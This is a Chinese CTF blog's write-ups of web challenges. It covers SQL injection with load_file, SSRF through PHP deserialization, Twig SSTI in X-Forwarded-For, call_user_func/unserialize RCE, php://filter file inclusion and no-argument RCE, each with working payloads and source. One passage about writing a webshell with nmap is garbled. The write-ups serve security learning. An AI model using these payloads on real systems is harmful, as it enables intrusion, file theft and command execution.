.75rem 0; text-align: center; font: .75rem sans-serif; &#125; .selector-button &#123; padding: .25rem .75rem; font: .75rem sans-serif; border: none; border-radius: 4px; cursor: pointer; &#125; .wait-select-button &#123; color: #f0f0f0; background: #337ab7; &#125; .wait-select-button:active &#123; color: #a0a0a0; background: #1a456b; &#125; .selected-button &#123; color: #f0f0f0; background: #d9534f; &#125; .selected-button:active &#123; color: #a0a0a0; background: #843534; &#125; aside &#123; display: flex; padding: 1rem; width: 100%; height: 100%; justify-content: space-between; align-items: center; font: 1rem sans-serif; background: #fff; &#125; .ok-button &#123; padding: .5rem .75rem; border: none; color: #fff; background: #337ab7; cursor: pointer; &#125; .ok-button:active &#123; color: #a0a0a0; background: #1a456b; &#125;&lt;/style&gt;&lt;/body&gt;&lt;/html&gt; 官方 wp 12345678910111213141516171819202122232425262728293031323334353637383940414243from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.ui import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECfrom time import sleepdriver = webdriver.Chrome()driver.get(&quot;http://127.0.0.1:8000&quot;)sleep(3)courses_list = []for i in range(1, 6): course = &#123; &#x27;panel&#x27;: f&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;, &#x27;status&#x27;: f&#x27;//*[@id=&quot;selector\u0002container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;, &#x27;submit&#x27;: f&#x27;//*[@id=&quot;selector\u0002container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27; &#125; courses_list.append(course)print(courses_list)while courses_list: driver.refresh() sleep(2) for course in courses_list: panel = driver.find_element(By.XPATH, course[&#x27;panel&#x27;]) panel.click() status_element = driver.find_element(By.XPATH, course[&#x27;status&#x27;]) status_text = status_element.text print(status_text) if status_text != &quot;已满&quot;: submit_button = driver.find_element(By.XPATH, course[&#x27;submit&#x27;]) submit_button.click() WebDriverWait(driver, 5).until(EC.alert_is_present()) alert = driver.switch_to.alert alert.accept() courses_list.remove(course) breaksleep(10)driver.quit() 解释一下这段代码 12345course = &#123; &#x27;panel&#x27;: f&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;, &#x27;status&#x27;: f&#x27;//*[@id=&quot;selector\u0002container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;, &#x27;submit&#x27;: f&#x27;//*[@id=&quot;selector\u0002container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27;&#125; 1、 f'//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]' 这段代码是一个 XPath 表达式，通常用于在 XML 或 HTML 文档中定位特定元素。 // : 这表示从文档的根节点开始，查找所有符合条件的元素。 * : 通配符，表示匹配任何元素节点。 [@id=&quot;selector-container&quot;] : 这部分表示选择具有 id 属性值为 &quot;selector-container&quot; 的元素。 /section : 表示在前一步选择的元素中查找名为 &quot;section&quot; 的子元素。 [i] : 这个部分是一个占位符，可能是用来代表某个具体的索引值，但在这里代码片段中缺少了具体的定义。一般来说，它会替换为一个整数值，以选择第 i 个匹配的元素。 /div[1] : 表示在前一步选择的 section 元素中选择第一个 div 子元素。 因此，这个 XPath 表达式的含义是：选择 id 为 &quot;selector-container&quot; 的元素下的第 i 个 section 元素中的第一个 div 子元素。 f'...' 是一种格式化字符串的方式，被称为 f-string。在 f-string 中，可以直接在字符串中嵌入变量或表达式，并在运行时求值。在你的代码中， f'//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]' 中的 &#123;i&#125; 是一个占位符，表示在运行时会被变量 i 的值替换掉，这样就可以动态地构建 XPath 表达式。 2、 '//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]' 这个 XPath 表达式用于定位 HTML 页面中的某个特定元素。 //*[@id=&quot;selector-container&quot;] : 从根节点开始，选择 id 属性为 &quot;selector-container&quot; 的元素。 /section[&#123;i&#125;] : 在选中的元素中选择第 i 个 section 子元素。 /div[2] : 在选中的 section 元素中选择第二个 div 子元素。 /table : 在选中的 div 元素中选择 table 子元素。 /tbody : 在选中的 table 元素中选择 tbody 子元素（如果存在）。 /tr : 在选中的 tbody 元素中选择 tr 子元素。 /td[5] : 在选中的 tr 元素中选择第五个 td 子元素。 因此，这个 XPath 表达式的含义是：选择 id 为 &quot;selector-container&quot; 的元素下的第 i 个 section 元素中的第二个 div 子元素中的 table 元素中的 tbody 子元素中的第五个 td 子元素。 3、 WebDriverWait(driver, 5).until(EC.alert_is_present()) 这行代码使用了 Selenium 的 WebDriverWait 类来等待浏览器中出现一个警告框（alert）。具体来说： WebDriverWait(driver, 5) 创建了一个 WebDriverWait 对象，指定了最长等待时间为 5 秒。这意味着程序将最多等待 5 秒钟，如果在这段时间内没有找到警告框，将会抛出一个 TimeoutException。 .until(EC.alert_is_present()) 调用了 until 方法，并传入了一个 ExpectedCondition，即 EC.alert_is_present ()。这个 ExpectedCondition 会持续检查浏览器是否出现了一个警告框，直到它出现或者等待时间超时为止。 因此，这行代码的作用是等待最多 5 秒钟，直到浏览器中出现一个警告框为止。 添加完注释的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344from selenium import webdriverfrom selenium.webdriver.common.by import By #提供了一系列用于定位元素的方法，可以通过不同的方式（如ID、类名、XPath等）来定位页面上的元素from selenium.webdriver.support.ui import WebDriverWait #用于实现等待页面元素加载完成或特定条件满足的功能。通过使用WebDriverWait类，可以在自动化测试脚本中添加显式等待from selenium.webdriver.support import expected_conditions as EC #用于配合WebDriverWait类进行等待操作。这些条件可以用于等待页面上的某些特定状态或事件发生，如元素可见、元素存在、元素包含特定文本等。from time import sleepdriver = webdriver.Chrome()driver.get(&quot;http://106.14.57.14:31446/&quot;)sleep(3) #等待页面完全加载courses_list = []#根据网页的html就是f12的查看器里的内容来获取课程的列表for i in range(1, 6): course = &#123; &#x27;panel&#x27;:f&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[1]&#x27;, &#x27;status&#x27;:f&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[5]&#x27;, &#x27;submit&#x27;:f&#x27;//*[@id=&quot;selector-container&quot;]/section[&#123;i&#125;]/div[2]/table/tbody/tr/td[6]/button&#x27; &#125; courses_list.append(course)print(courses_list)while courses_list: driver.refresh() #网页刷新 sleep(2) for course in courses_list: panel = driver.find_element(By.XPATH, course[&#x27;panel&#x27;]) #查找页面上符合指定XPath表达式的第一个元素 panel.click() #点击面板（页面加载完成后所有课程都是收起来的，需要点击展开） status_element = driver.find_element(By.XPATH, course[&#x27;status&#x27;]) status_text = status_element.text #获取XPATH路径相关内容，用来判断课程是不是满的，作为能不能进行下列抢课操作的前提 print(status_text) if status_text != &quot;已满&quot;: submit_button = driver.find_element(By.XPATH, course[&#x27;submit&#x27;]) submit_button.click() WebDriverWait(driver, 5).until(EC.alert_is_present()) #见上文 alert = driver.switch_to.alert #这种操作是在页面上出现警告框时使用的，以便对警告框进行处理，比如接受或取消警告，获取警告文本等 alert.accept() #应该是抢课成功接受alert弹窗 courses_list.remove(course) #从需要抢课的列表中删除已抢到的课 breaksleep(10)driver.quit() #关闭浏览器 运行脚本等待所有的课都选完，打开靶机 url，点击选完了，就能得到 flag hgamew0W_!_1E4Rn_To_u5e_5cripT_【_^】 # ezHTTP 这里顺带记录一下 ezHTTP 新学到的东西： XFF 在这题被禁用了，不能用 XFF 和 Client-ip，可以用 X-Real-IP 尝试一下 这里就是使用 X-Real-IP 就可以了","categories":[{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://dr4x3zz.github.io/tags/ctf/"}]},{"title":"buuctf刷题3","slug":"buuctf刷题3","date":"2024-01-27T08:26:08.000Z","updated":"2024-11-08T10:05:45.311Z","comments":true,"path":"2024/01/27/buuctf刷题3/","link":"","permalink":"https://dr4x3zz.github.io/2024/01/27/buuctf%E5%88%B7%E9%A2%983/","excerpt":"# [RoarCTF 2019]Easy Java","text":"# [RoarCTF 2019]Easy Java 学习链接：https://blog.csdn.net/xhy18634297976/article/details/123117897 点击 help java.io.FileNotFoundException: 这里记录一下 Servlet 和 WEB-INF Servlet Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。 使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。 具体的可以看：https://www.runoob.com/servlet/servlet-intro.html WEB-INF WEB-INF 是 java 的 WEB 应用的安全目录。 1、WEB-INF/web.xml web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 2、WEB-INF/classes 包含了站点所有有用的 class 文件，包括 servlet class 和非 servlet class。 3、WEB-INF/lib 存放 web 应用需要的 JAR 文件。 4、WEB-INF/src 源码目录，按照包名结构放置各个 java 文件。 5、WEB-INF/database.properties 数据库配置文件。 6、WEB-INF/tags 存放了自定义标签文件。 7、WEB-INF/jsp jsp1.2 以下版本的文件存放位置。 8、WEB-INF/jsp2 存放 jsp2.0 以下版本的文件。 9、META-INF 相当于一个信息包。 漏洞形成原因： Tomcat 的 WEB-INF 目录，每个 j2ee 的 web 应用部署文件默认包含这个目录。（对于 j2ee 可以看这个博客：https://blog.csdn.net/youtufeitu/article/details/124891927?ops_request_misc=%7B%22request%5Fid%22%3A%22170636067716800192265035%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=170636067716800192265035&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2alltop_positive~default-1-124891927-null-null.142v99pc_search_result_base7&amp;utm_term=j2ee&amp;spm=1018.2226.3001.4187） Nginx 在映射静态文件时，把 WEB-INF 目录映射进去，而又没有做 Nginx 的相关安全配置（或 Nginx 自身一些缺陷影响）。从而导致通过 Nginx 访问到 Tomcat 的 WEB-INF 目录（请注意这里，是通过 Nginx，而不是 Tomcat 访问到的，因为上面已经说到，Tomcat 是禁止访问这个目录的。）。 这里对 Nginx 和 Tomcat 的关系也做一点记录： nginx 在负载均衡里是前端服务器，用来处理请求的转发（反向代理等）；是静态页面服务器。绝大部分时候他们本身并不会运行项目. Tomcat 是后端服务器，属于 Java Servlet 容器。用来生成动态页面。是直接用来运行项目的容器。简单来说就是你发出一个请求，先经过 nginx, 它们会合理地把请求分配到后台比较不忙的 Tomcat.Tomcat 会把请求处理好返回给 Nginx, 然后 Nginx 会把最终的结果传送给浏览器。当然，如果是一些静态的数据，Nginx 就可以直接处理了。 漏洞利用方式： 直接在域名后面加上 WEB-INF/web.xml 就可以了。根据 web.xml 配置文件路径或通常开发时常用框架命名习惯，找到其他配置文件或类文件路径。dump class 文件进行反编译。通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 上面的解释我大部分都是直接照搬的，通过大佬的解释应该是获取 web.xml 文件 跟着 wp 走 这里抓包把 get 改成 post 看到 com.wm.ctf.FlagController，试着下载 FlagController.class 构建 payload： 1/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 可以看到有一串 base64 加密的内容，解码发现就是 flag flag flag 拿的挺懵的，对 java 的内容还是接触不多，payload 的构建也是不太懂 # [网鼎杯 2018] Fakebook 学习链接：https://blog.csdn.net/qq_58784379/article/details/120548225 先用 dirsearch 扫描一下 1python dirsearch.py -u http://8d8f949c-e060-4a7c-9ebf-de266c4a5bef.node5.buuoj.cn:81/ -e * 可以看到存在 robots.txt，访问一下 下载下来，打开可以看到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; 代码审计 构造了一个 UserInfo 类，有三个属性，分别是 name、age 和 blog 123456789101112131415function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; 通过 get 获取 url，设置 curl 参数，将指定的 url 内容返回，内容不是 404 就可以返回 curl_setopt (int ch, string option, mixed value) curl_setopt () 函数将为一个 CURL 会话设置选项。option 参数是你想要的设置，value 是这个选项给定的值。 curl_getinfo() —— 获取一个 cURL 连接资源句柄的信息 最后还对 blog 正则匹配 回到题目，先注册一下看看 注册完后可以发现 admin 是可以点击的 点击进去查看网页源代码发现他是可以回显 blog 里的内容 这个 base64 解码之后会发现很多百度相关的元素，比如百度一下，你就知道这种 title，这个 src 用的是 data 协议，在做 php 伪协议的题目也有用来读取 flag 仔细看 url，其实可以发现类似 sql 注入常用的 id 参数，这里是 no 1http://781fc949-b9d2-4223-9f55-8d9fed53a21a.node5.buuoj.cn:81/view.php?no=1 尝试一下 sql 注入 加个单引号可以发现有回显错误 发现本题不需要再去闭合符号，order by 查字段数，在查询到 5 的时候出错了，说明有 4 个字段 1view.php?no=0 order by 5# 用联合注入看看回显字段，用 /**/ 替换空格，不替换的话会显示 no hack ~_~ /**/ 可以绕过检查 1view.php?no=0/**/union/**/select/**/1,2,3,4# 回显字段是 2，获取当前数据库 1view.php?no=0/**/union/**/select/**/1,database(),3,4# 查询用户 1view.php?no=0/**/union/**/select/**/1,user(),3,4# 解法 1： mysql 中的 load_file () 函数可以访问系统内任意文件，可以将内容以字符串形式返回，而且不用很高的权限，但是需要绝对路径，绝对路径在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 /var/www/html/view.php ，flag.php 在扫描的时候发现适合 view.php 同一个目录下，所以 flag.php 的绝对路径应该就是 /var/www/html/flag.php payload: 1view.php?no=0/**/union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4# 查看源码 拿到 flag，flag 解法 2： 爆表 1view.php?no=0/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;fakebook&#x27;# 表名 users 爆字段 得到四个字段名 no,username,passwd,data 爆出 username,passwd,data 1view.php?no=0/**/union/**/select/**/1,group_concat(username,passwd,data),3,4/**/from/**/users# data 内容为 O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125; 这是一个 UserInfo 对象序列化后，如果 select 把这个内容传回去会出现什么 1view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;&#x27;from users# 直接是回显了 blog 的内容，尝试构造一个反序列化的内容去获取 flag，在扫描的时候是有发现 flag.php 的文件，而且上面在尝试 sql 注入的时候是有发现绝对路径 /var/www/html/view.php ，flag.php 在扫描的时候发现适合 view.php 同一个目录下 payload（注意 s 后面的数字是 29，改了参数大小不能不改）: 1view.php?no=0/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;from users# f12 查看内容，base64 解码 得到 flag，flag # [BJDCTF2020]The mystery of ip 在 flag 页面发现 ip 地址，题目名称叫 ip 的秘密，看了大佬们的 wp 发现是存在 X-Forwarded-For 注入 抓包，添加 XFF 1X-Forwarded-For: 1 可以看到 ip 被修改为 1，说明 XFF 是可控的 这里做个记录 SSTI 漏洞 1.php 常用的 Smarty：Smarty 算是一种很老的 PHP 模板引擎了，非常的经典，使用的比较广泛 Twig：Twig 是来自于 Symfony 的模板引擎，它非常易于安装和使用。它的操作有点像 Mustache 和 liquid。 Blade：Blade 是 Laravel 提供的一个既简单又强大的模板引擎。和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。 2.Java 常用的 JSP：这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典 FreeMarker：FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML 网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户的，而是一个 Java 类库，是一款程序员可以嵌入他们所开发产品的组件。 Velocity：Velocity 作为历史悠久的模板引擎不单单可以替代 JSP 作为 JavaWeb 的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。 3.Python 常用的 Jinja2：flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎 django：django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的 ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了 tornado：tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发 看别的师傅的 wp，这题相关的应该是下面两个 1、Flask 可能存在 Jinjia2 模版注入漏洞 Flask 是一个很常用的 python 框架，其中存在 SSTI 漏洞。 SSTI，服务端模板注入，很早就知道这个东西，但没有仔细整理过，作为一种注入漏洞，简单说就是用户的说明会变成命令执行，比如 &#123;&#123;7*7&#125;&#125; 会变成 49。 模板： 12templeta = &quot;hello&quot; + &#123;&#123;user,id&#125;&#125;render(templeta) 这里大括号里的东西是可变的，而当用户传入某些参数时系统可能会把用户的参数当成代码执行，例如 &#123;&#123;7*7&#125;&#125; 在执行时就会变成 49，这就存在漏洞。进一步，既然存在注入那肯定可以试着去执行系统命令，诸如 &#123;&#123;os.system('ls')&#125;&#125; 等等，继而引发各种问题。 2、PHP 可能存在 Twig 模版注入漏洞 在 Twig 模板中可以直接调用函数，用于生产内容。如下调用了 range() 函数用来返回一个包含整数等差数列的列表： 1234&#123;% for i in range(0, 3) %&#125;&#123;&#123; i &#125;&#125;,&#123;% endfor %&#125;// Output: 0, 1, 2, 3 那这里尝试添加模板的算式，看看是否存在注入漏洞 1X-Forwarded-For: &#123;&#123;9*9&#125;&#125; 确实存在漏洞，尝试是否能执行命令 1X-Forwarded-For: &#123;&#123;system(&#x27;ls&#x27;)&#125;&#125; 尝试获取查找 flag 的位置 1X-Forwarded-For: &#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125; 可以看到在 / 目录下存在 flag，尝试读取 flag 1X-Forwarded-For: &#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125; 得到 flag，flag # [网鼎杯 2020 朱雀组] phpweb 题目进来一直在刷新，f12 也没什么收获，抓个包看看 抓包后可以发现以 POST 方式提交了两个参数一个是 func 一个是 p，func=date，p 是日期的格式，页面也一直回显这个形式的时间，func 又是常用的自定义函数名，验证一下二者是否有关系，可以使用 md5 () 函数 1func=md5&amp;p=123 可以发现回显内容已经变成了 md5 加密的 123，这里可以尝试使用命令了 1func=system&amp;p=&#x27;ls&#x27; 存在过滤，那可以尝试一下读取源码，可以使用多种函数进行查看，比如说：file_get_contents ()、highlight_file () ，show_source () 等 这里使用 file_get_contents () 函数 file_get_contents (path): 读取 path 路径下文件的内容 1func=file_get_contents&amp;p=index.php 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; 过滤了很多常用的函数，尝试反序列化 exp: 12345678910111213&lt;?php class Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125;&#125;$a = new Test();echo serialize($a);?&gt; payload: 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 不在这一层里，返回上一层 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls /&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 还是没有，使用 system(&quot;find / -name flag*&quot;) 来匹配文件名带有 flag 的所有文件 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 尝试读取这几个文件吧，这里面路径大部分都是相同的挑着读吧 /sys/devices/platform/serial8250/tty/ttyS25/flags /sys/devices/virtual/net/lo/flags /tmp/flagoefiu4r93 最后一个就是 flag 1func=readfile&amp;p=/tmp/flagoefiu4r93 flag 这里看到有个师傅的 payload 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; 应该是读取了所有的文件， cat $(find / -name flag*) 这段代码能理解为把所有文件名里面带有 flag 的文件当作一个新的变量然后一起读取出来？ $ 是建一个 php 变量，可能可以这么理解吧。 # [BSidesCF 2020]Had a bad day 进入网页，发现可能存在 sql 注入或者文件包含漏洞 http://9f9eacab-cb17-497a-b9bf-5aed58ad2bc7.node5.buuoj.cn:81/index.php?category=woofers 使用 php 伪协议尝试读取 index.php 1?category=php://filter/convert.base64-encode/resource=index.php 可以看到 warning 里面的内容 php://filter/convert.base64-encode/resource=index.php.php index.php 后面还有一个后缀，这里尝试删去 payload 里的 .php 看看能否读取成功 1?category=php://filter/convert.base64-encode/resource=index 成功读取，base64 解码，提取出有用的信息 12345678910111213&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; 这里做个记录： strpos ()- 查找字符串在另一字符串中第一次出现的位置（区分大小写）。 strrpos ()- 查找字符串在另一字符串中最后出现的位置（区分大小写）。 stripos ()- 查找字符串在另一字符串中第一次出现的位置（不区分大小写）。 strripos ()- 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）。 strpos(string,find,start) string： 必须。 规定被搜索的字符串。 find： 必须。 规定要查找的字符。 代码审计，利用 GET 方式传入的 category 需要有 woofers、meowers、index 三者之一才能包含传入 file 作为文件名 尝试读取 flag.php，经过尝试可以知道 flag 在 woofers 的上一级目录 1?category=woofers/../flag 查看源码看到提示 Can you read this flag? 尝试使用 php 伪协议读取 这里记录一下 php://filter 伪协议可以套一层协议 12php://filter/read=convert.base64-encode/woofers/resource=flagphp://filter/read=index/convert.base64-encode/resource=flag 这两种嵌套都是可以的 base64 解码 1234&lt;!-- Can you read this flag? --&gt;&lt;?php // flag&#123;3d618b09-d7ce-4d87-8464-01fb7bd3285e&#125;?&gt; 拿到 flag # [BJDCTF2020] ZJCTF，不过如此 代码审计 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; GET 方式获取两个参数，text 需要 ===I have a dream，file 根据提示利用 php 伪协议读取 构造 payload： 1?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php base64 解码得到 next.php 12&lt;?php ?&gt; -oG muma.php &#x27; 蚁剑链接，早最高一级目录找到 flag 也可以打开终端 cat /flag 得到 flag flag # [GXYCTF2019] 禁止套娃 学习链接：https://blog.csdn.net/m0_62879498/article/details/124538469 无参数 RCE 总结：https://blog.csdn.net/Manuffer/article/details/120738755、https://blog.csdn.net/2301_76690905/article/details/133808536 进去就发现是个除了 flag在哪里呢？ 这段文字就白的不能再白的页面了，源码也没有，dirsearch 扫描也没有什么其他的文件但是有 /.git 的东西，看了别的师傅的 wp 才知道这个是源码泄露，利用 GitHack 获取源码 贴一个 GitHack 下载地址：https://github.com/lijiejie/GitHack 扫描完得到一个 index.php，获取到源码了 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;还差一点哦！&quot;); &#125; &#125; else&#123; die(&quot;再好好想想！&quot;); &#125; &#125; else&#123; die(&quot;还想读flag，臭弟弟！&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; 代码审计： 可以看到 preg_match 把 php 伪协议给禁用了，不能使用 data、filter 等 如果 ';'===preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) ，那么就执行 exp 的内容 对于 [a-z,_]+ 的解释 : [a-z,_] 匹配小写字母和下划线 + 表示 1 到多个 对于 (?R)? 的解释 : (?R) 代表当前表达式，就是这个 (/[a-z,_]+((?R)?)/) ，所以会一直递归，? 表示递归当前表达式 0 次或 1 次（若是 (?R)* 则表示递归当前表达式 0 次或多次，例如它可以匹配 a (b (c () d ()))） preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) 又进行了一次黑名单过滤，类似带有 et、na、info 等字样的函数都不能用了，get、phpinfo 等等都不行了 这里就要用到无参数 rce 了，相关函数做个记录： scandir () ：将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob () 可替换） localeconv () ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个。的用处很大） current () ：返回数组中的单元，默认取第一个值。注：pos () 和 current () 是同一个东西 pos () ：返回数组中的当前元素的值。pos 是 current 的别名。 getcwd () ：取得当前工作目录 dirname ()：返回路径中的目录部分 array_flip ()：交换数组中的键和值，成功时返回交换后的数组 array_rand () ：从数组中随机取出一个或多个单元 array_reverse ()：将数组内容反转 strrev ()：用于反转给定字符串 chdir () ：函数改变当前的目录。 eval ()、assert ()：命令执行 hightlight_file ()、show_source ()、readfile ()：读取文件内容 查看当前目录下文件，payload： 1?exp=var_dump(scandir(current(localeconv()))); 